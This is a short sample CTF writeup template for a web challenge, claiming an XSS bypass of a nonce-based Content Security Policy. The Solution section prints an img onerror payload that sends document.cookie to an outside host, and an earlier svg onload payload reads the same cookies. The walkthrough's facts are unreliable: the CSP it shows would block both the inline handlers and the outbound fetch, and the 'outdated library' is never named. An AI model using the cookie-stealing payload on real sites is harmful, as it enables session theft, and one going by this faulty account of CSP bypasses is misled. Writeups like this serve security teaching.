---
title: "Sample Writeup with Images"
date: "2025-06-19"
ctf: "Example CTF 2025"
category: "Web"
difficulty: "Medium"
points: 500
tags: ["xss", "javascript", "csp"]
author: "Tham Le"
solved: true
featured: true
banner: "assets/images/banners/sample-banner.jpg"
thumbnail: "assets/images/thumbnails/sample-thumbnail.jpg"
description: "A walkthrough of an interesting XSS challenge that required bypassing a Content Security Policy."
---

# Sample Writeup with Images

**Category:** Web  
**Difficulty:** Medium  
**Points:** 500  
**Event:** Example CTF 2025

## Challenge Description

This example shows how to format a writeup with images for the new version of the CTF writeups site.

The challenge asked us to bypass a strict Content Security Policy to execute JavaScript on the admin's browser.

**URL:** <https://example-ctf.com/challenge>

## Initial Analysis

When we first access the site, we're presented with a simple form that allows us to submit messages that an admin will review.

![Screenshot of challenge homepage](./images/homepage.png)

## Vulnerability Discovery

After inspecting the page, I noticed the Content Security Policy header:

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-random123'
```

This CSP only allows scripts with a specific nonce attribute to execute.

## Exploitation

I discovered that the application was using an outdated library that had an XSS vulnerability. By crafting a special payload, I could bypass the CSP:

```javascript
<svg onload="alert(document.cookie)">
```

![Screenshot of payload execution](./images/payload.png)

## Solution

The final payload looked like this:

```html
<img src="x" onerror="fetch('https://my-server.com/?cookie='+document.cookie)">
```

## Flag

`CTF{th1s_1s_4_s4mpl3_fl4g}`

## Reflection

This challenge taught me the importance of:

1. Understanding CSP bypass techniques
2. Checking for outdated libraries
3. Being creative with payload delivery

## Additional Resources

- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
